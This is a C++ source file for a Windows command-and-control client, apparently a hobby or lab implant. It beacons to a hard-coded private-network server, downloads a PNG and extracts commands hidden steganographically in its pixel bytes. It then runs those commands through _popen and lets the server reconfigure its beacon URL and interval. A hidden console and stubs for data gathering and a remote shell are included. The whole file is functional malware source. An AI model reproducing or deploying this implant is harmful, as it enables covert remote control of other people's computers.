// C2client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <winsock2.h>
#include <WS2tcpip.h>
//Header for Image Decoding
#include <wincodec.h>
#include <wincodecsdk.h>
#pragma comment(lib, "WindowsCodecs.lib")
#include <atlbase.h>
#include <atlcoll.h>
//Header for Windows Sockets
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <stdio.h>
#include <regex>
#include <stdexcept>
#include <sstream>
#include <map>



//Struct for client socket
struct Client {
	struct addrinfo* result, * ptr, hints;
};

// To hide the console window I modified compiler settings as follows: Under linker set Subsystem to /SUBSYSTEM:windows  and Entry point to: mainCRTStartup
UINT GetStride(const UINT width, const UINT bitCount);
HRESULT getCommands(std::string *commands);
size_t executeCommands(std::vector<std::string>*);
size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader);
int initSock(Client* client);
int parseHeader(char* header, std::map<std::string, std::string>* headerMap);
//Struct Types for command
//Command sequence: <COM: TYPE-VALUE:TYPE-VALUE....etc>

enum TYPE {
	KILL, //0-0
	CONF, //1-VAR-VAL
	GATH, //2-INF
	SHELL,//3-0
	EXEC, //4-COMMAND
};
//Global Variables
bool COInit = FALSE;				//COInit can only be initialized once
std::string ID = "ASAFW";
std::string URL = "http://10.0.0.35:8080/images/testing.png";
unsigned long int beaconTime = 5000;	//How often client beacans out to server

int main()
{	
	std::string commands;					//String to hold commands (Used to grab all encoded commands from image)
	std::vector<std::string> commandList;	//Vector to store each individual command
	HRESULT HR;								//Error handler for COM Objects
	
	/*Initialize Client*/
	//Initialize the COM library for use by the calling thread. This function must be called, and can only be called once from the same thread. 
	//pvReserved is reserved and must be NULL, COINT value is Apartment Threaded(Single Threaded COM Thread)
	if ((HR = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)) != S_OK) {
		OutputDebugStringA("Client: Unable to inititialize COM Library\n");
		exit(EXIT_FAILURE);
	}

	//Initialize Socket
	//1. Initialize WinSock
	//2. Create a socket
	//3. Connect to server
	Client client;
	initSock(&client);
	//4. Send Request, Get request
	//5 Disconnect

	//Loop Forever here
	while (true) {
		//Sleep for 5 seconds before checking C2 server again
		Sleep(beaconTime);
		//Decode the image and get the commands
		if ((HR = getCommands(&commands)) != S_OK) {
			OutputDebugStringA("Server: Unable to grab encoded commands\n");
			continue;
		}
		//Parse Command header
		if (parseCommands(&commandList, commands) == -1) {
			OutputDebugStringA("Server: Unable to parse commands\n");
			//clear commands previously grabbed
			commandList.clear();
			commands = "";
			continue;
		}
		//Execute commangs grabbed
		executeCommands(&commandList);
		//Clear Commands
		commands = "";
		commandList.clear();
			
			

		
	}

}


//Grab Encoded commands from Image
HRESULT getCommands(std::string *commands ) {
	//Initialize Variables
	size_t commandL;			 //Size in bytes to parse
	std::string command;		//String to store encoded command
	HRESULT hr;					//Error handling 
	UINT frameCount = 0;		//Framecount (1 for PNGs, including this in now for future compatibility with other file formats)
	UINT width = 0;				//width fo the image
	UINT height = 0;			//Height of the image
	GUID pixelFormat = { 0 };	//Used to store the pixel format (Should be BGRA - 32bits)

	//create a CComPtr Istream smart pointer for managing the COM interface
	CComPtr<IStream> stream;
	//Create a smart pointer gain acces to the decoder's properties
	CComPtr<IWICBitmapDecoder> decoder;
	//Smart pointer to gain access to interface that defines methods for decoding individual image frames
	CComPtr<IWICBitmapFrameDecode> frame;
	//Open file and retrieve a stream to read from the file
	if ((hr = SHCreateStreamOnFileEx(L"temp.png", STGM_READ, FILE_ATTRIBUTE_NORMAL, FALSE, NULL, &stream)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Create an instance of a COM object to the WICPNGDecoder interface
	if ((hr = decoder.CoCreateInstance(CLSID_WICPngDecoder)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Initialize the png decoder with the encoded png stream
	if ((hr = decoder->Initialize(stream, WICDecodeMetadataCacheOnDemand)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Grab the frame count
	if ((hr = decoder->GetFrameCount(&frameCount)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Get the frame
	if ((hr = decoder->GetFrame(0, &frame)) != S_OK) {
		stream.Release();
		return hr;
	}
	//From the frame determine the width and height
	if ((hr = frame->GetSize(&width, &height)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Grab the pixel format
	if ((hr = frame->GetPixelFormat(&pixelFormat)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Validate pixel format. This project only supports 32 bit BGRA PNG files.
	if (pixelFormat != GUID_WICPixelFormat32bppBGRA) {
		stream.Release();
		return hr;
	}
	//Get the stride
	const UINT stride = GetStride(width, 32);
	//A CAtlArray will be used to store the image data
	//The Destructor will clean this up for us once the object goes out of context
	CAtlArray<BYTE> buffer;
	//Set the size of the array object to the size of the image
	buffer.SetCount(stride * height);
	//Copy the frame pixels to the CAtlArray buffer
	hr = frame->CopyPixels(0, stride, buffer.GetCount(), buffer.GetData());
	//Grab Length of the command hidden int he pixel (In Bytes). It will always be the lease significant byte of the BGR value (3rd pixel)
	commandL = buffer[2];
	//Iterate through the pixels and grab the least significant bytes of the BGR value (Since this is BGRA, we will be gabbing the red pixel value)
	for (int i = 1; i <= commandL;i++) {
		command += buffer[i*4+2];
	}
	*commands = command;
	//Release the stream.
	stream.Release();
	return hr;

}//CComPtr auto releases underlying IErrorInfo interface
//Parse Command Header for all commands in the encoded message;
size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader) {
	int currentPos = 0;	//Tail
	int nextPos = 0;	//Head
	//Move to the first position of : (Indicates first command)
	currentPos = commandHeader.find_first_of(":");
	if (currentPos == std::string::npos) {
		return -1;
	}
	//Go through entire string, grab each command, and append them to the commandList
	while (currentPos != std::string::npos) {
		//Increment to position of the next command; We will use this to grab the entire string betweem currentPos and nextPos
		nextPos = commandHeader.find_first_of(":", currentPos + 1);
		//If nextPos = npos, this is the last command, grab it and break from loop
		if (nextPos == std::string::npos) {
			commandList->push_back(commandHeader.substr(currentPos + 1, commandHeader.length() - currentPos-2));
			break;
		} 
		commandList->push_back(commandHeader.substr(currentPos + 1, nextPos - currentPos - 1));
		currentPos = nextPos;
	}
	return 0;
}
//Execute Commands
size_t executeCommands(std::vector<std::string>* list) {
	std::string varName;
	std::string varValue;
	//Iterate through commands and call them (Will need parsing later);
	for (auto n : *list) {
		//Grab the ID to see if commands are meant for this client, or if we need to ignore them
		if (n.find_first_of("-") == std::string::npos && n == list->at(0)){
			if (n == ID || n == "ALL") {
				OutputDebugStringA("Commands are meant for this client");
				continue;
			}else{
				OutputDebugStringA("Commands not meant for this client\n");
				return -1;
			}
		}
		//Get Type and Value of each command
		int type = std::stoi(n.substr(0, n.find_first_of("-")));
		std::string value = n.substr(n.find_first_of('-') + 1, n.length());
		//Idnetify type of command
		switch (type) {
			//Case Kill: Cleanup artificats and kill program
			case KILL:
				exit(0);
				break;
			//Case CONF: Configure a global variabl (Such as beaconing sequence, the URL to reach out to, etc....
			case CONF:
				//Grab var name
				varName = value.substr(0, value.find_first_of("-"));
				//Grab var value
				varValue = value.substr(value.find_first_of('-') + 1, value.length());
				if (varName == "url") {
					URL = "http://10.0.0.34:8080/images/" + varValue;
				}
				else if (varName == "beacon") {
					beaconTime = atoi(varValue.c_str());
				}
				break;
			//Case GATH: Gather information and execute a post request to the server
			case GATH:
				break;
			//Establish a persistent connection to the server
			case SHELL:
				break;
			//Execute a Command
			case EXEC:
				char buff[4096];
				std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(value.c_str(), "rt"), &_pclose);
				if (!pipe) {
					OutputDebugStringA("Failed to execute system command\n");
				}
				else {
					while (fgets(buff, sizeof(buff), pipe.get()) != nullptr) {
						OutputDebugStringA(buff);
					}
				}
				break;
		}
		//Call System Commands
	}
	return true;
}
//Get the stride of the image
UINT GetStride(const UINT width, const UINT bitCount) {
	const UINT byteCount = bitCount / 8;
	const UINT stride = (width * byteCount);
	return stride;
}

int initSock(Client *client) {
	WSADATA wsaData;
	int result;
	//Initialize Winsock (Initiate use of WS2_32.dll)
	//MAKEWORD(2,2) makes a request for version 2.2 of Winsock
	if ((result = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0) {
		//Need to improve debug logging for this....
		OutputDebugStringA("Client: Failed Initializing WSAstartup: \n");
		return result;
	}
	//Ensure memory of struct is clear
	ZeroMemory(&client->hints, sizeof(client->hints));
	client->hints.ai_family = AF_UNSPEC; //Unspecified so we can use either IPV4/IPV6
	client->hints.ai_socktype = SOCK_STREAM;
	client->hints.ai_protocol = IPPROTO_TCP;

	if ((result = getaddrinfo("10.0.0.35", "8080", &client->hints, &client->result)) != 0) {
		OutputDebugStringA("Client: Failed to getaddrinfo for server: \n");
		WSACleanup();
		return result;
	}

	SOCKET sock;
	client->ptr = client->result;
	if ((sock = socket(client->ptr->ai_family, client->ptr->ai_socktype, client->ptr->ai_protocol)) == INVALID_SOCKET) {
		OutputDebugStringA("Client: Failed to create socket: \n");
		freeaddrinfo(client->result);
		WSACleanup();
		return result;
	}

	if ((result = connect(sock, client->ptr->ai_addr, (int)client->ptr->ai_addrlen)) == SOCKET_ERROR) {
		closesocket(sock);
		sock = INVALID_SOCKET;
		OutputDebugStringA("Client: Unable to connect to server: \n");
		freeaddrinfo(client->result);
		WSACleanup();
		return result;
	}

	//Test Buffer
	const char* sendbuf = "GET /images/testing.png HTTP/1.1";
	if ((result = send(sock, sendbuf, (int)strlen(sendbuf), 0)) == SOCKET_ERROR) {
		OutputDebugStringA("Client: Unable to send: \n");
		closesocket(sock);
		WSACleanup();
		return result;
	}
	//Bufer to hold data
	char* recvBuff = (char*)malloc(sizeof(char)* 4096);
	std::vector<std::string> token;
	if ((result = recv(sock, recvBuff, 1024, 0)) == -1) {
		OutputDebugStringA("Client: Did not recieve data from server");
		closesocket(sock);
		WSACleanup();
	}
	//std::string header(recvBuff, 1024);
	/*int beginning = 0;
	for (int end = 0; (end = header.find(" ", end)); end++) {
		token.push_back(header.substr(beginning, end - beginning));
		beginning = end + 1;
	}
	*/
	std::map<std::string, std::string> headerMap;
	if (parseHeader(recvBuff, &headerMap)) {
		return -1;
	}
	FILE* file;
	fopen_s(&file, "temp.png", "wb");
	if (file == NULL) {
		OutputDebugStringA("Client: Unable to open temporary file for writing\n");
		closesocket(sock);
		WSACleanup();
		return -1;
	}
	while (result > 0) {
		result = recv(sock, recvBuff, 4096, 0);
		fwrite(recvBuff, 1, result, file);
		memset(recvBuff, 0, sizeof(recvBuff));

	}
	//File can be closed now
	
	fclose(file);

}

//Parse Header, store attributes and values in a header map
int parseHeader(char* header, std::map<std::string, std::string>* headerMap) {
	std::istringstream resp(header);	//Input stream for string buffer
	std::string output;					//Temporary string to hold each line of the header request
	int index;							//Index for string
	int countInitial = 0;				//Used to parse HTTP version and status
	//Extract characters from the stream (Delim character is \n);
	while (std::getline(resp, output) && output != "\r") {
		//If initial, grab HTTP Version and Status Code
		if (countInitial == 0) {
			index = output.find(' ', 0);
			headerMap->insert(std::make_pair("Ver", output.substr(0, index)));
			headerMap->insert(std::make_pair("Status", output.substr(index + 1, output.length() - index -2)));
			countInitial = 1;
		}
		//Else, grab all other attributes and values
		else {
			index = output.find(':', 0);
			if (index != std::string::npos) {
				headerMap->insert(std::make_pair(output.substr(0, index),output.substr(index + 2,output.length() -index -3 )));
			}
		}
	}
	//Clear the buffer memory
	memset(header, 0, sizeof(header));
	return 0;
}